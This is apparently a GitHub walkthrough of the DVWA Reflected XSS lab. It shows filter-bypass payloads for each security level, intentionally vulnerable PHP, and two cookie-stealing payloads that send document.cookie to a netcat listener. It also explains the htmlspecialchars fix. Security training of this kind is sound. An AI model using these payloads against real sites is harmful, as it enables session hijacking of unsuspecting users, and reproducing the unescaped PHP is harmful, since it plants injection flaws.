# XSS (Reflected)

## About

> "Cross-Site Scripting (XSS)" attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application using input from a user in the output, without validating or encoding it.
> 
> An attacker can use XSS to send a malicious script to an unsuspecting user. The end user's browser has no way to know that the script should not be trusted, and will execute the JavaScript. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by your browser and used with that site. These scripts can even rewrite the content of the HTML page.
> 
> Because its a reflected XSS, the malicious code is not stored in the remote web application, so requires some social engineering (such as a link via email/chat).

Source: DVWA Documentation

## Low Security
The page is asking for an input of our name and then is reflected back on the page. So if we type `Harry` the application will say `Hello Harry`.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/XSS(Reflected)/!images/xssr1.png?raw=true">
</p>

But if we type instead an XSS payload, then this will happen:

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/XSS(Reflected)/!images/xssr2.png?raw=true">
</p>

The payload used: `Hacked"<script>alert(1)</script>`.<br/>
A lot of XSS payloads can be found online, some will work, some will not, depends on the filters implemented. The idea is that instead of input some valid text, we input some javascript that will be executed by the application.<br/>
Because our input is also reflected in the URL, we can send it to anyone and once is accessed, the script will be executed.<br/>
The URL: `http://localhost/DVWA/vulnerabilities/xss_r/?name=Hacked%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E#`.<br/>

In our payload, the impact is not harmful, we only triggered an alert box with number 1. This payload is usually used to confirm the presence of an XSS attack.<br/>
But more dangerous things can be done, for example rewriting the source code in order to ask the user to insert his password to continue. But the password is sent to the attacker.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/XSS(Reflected)/!images/xssr3.png?raw=true">
</p>

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/XSS(Reflected)/!images/xssr4.png?raw=true">
</p>

The source code:
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?> 
```
For this level, we have no restrictions implemented.

Let's also solve the objective of the challenge, which is: `Steal the cookie of a logged in user.`.<br/>
We can use the following payload: `<script>fetch('http://127.0.0.1:4444?cookie=' + btoa(document.cookie) );</script>`.
This will send the cookie of the current user to the attacker address, in a base64 format. In order to listen for this message, we can start a listener with netcat: `nc -lvnp 4444`.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/XSS(Reflected)/!images/xssr6.png?raw=true">
</p>

## Medium Security
For Medium level we have this filter implemented:
```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
```
This is not enough, because we can easily bypass it using uppercase letters: `<sCRipt>alert('XSS')</sCRipt>`.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/XSS(Reflected)/!images/xssr5.png?raw=true">
</p>

## High Security
For High level we have this filter implemented:
```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
```
Again, this is not a good implementation, because there are many XSS payloads that are not using the `<script>` tag.<br/>
The vulnerability can be executed using: `"<img src=x onerror=alert('XSS')>`. This payload will trigger an error with alert box, if the source of the image is not found.

For the objective of the challenge, we can use a netcat listener on port 4444 and the following payload: `<img src=x onerror='fetch("http://127.0.0.1:4444/?cookie=" + document.cookie)'>`.

## Impossible Security
Source code:
```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```
For the Impossible level, we have Anti-CSRF token implemented and our input is verified with `htmlspecialchars()` function. This function will convert the special HTML characters in order to not be interpreted as HTML valid code.<br/>
For example `&` becomes `&amp;`, `"` becomes `&quot;`, and so on.<br/>
Much more, in Impossible level the `X-XSS-Protection` header is not set to 0 anymore. This header stops pages from loading when detects reflected cross-site scripting (XSS) attacks. Nowadays `Content-Security-Policy` header is preferred instead.<br/>
In this case, we will not be able to use any special characters to alterate the application's code. 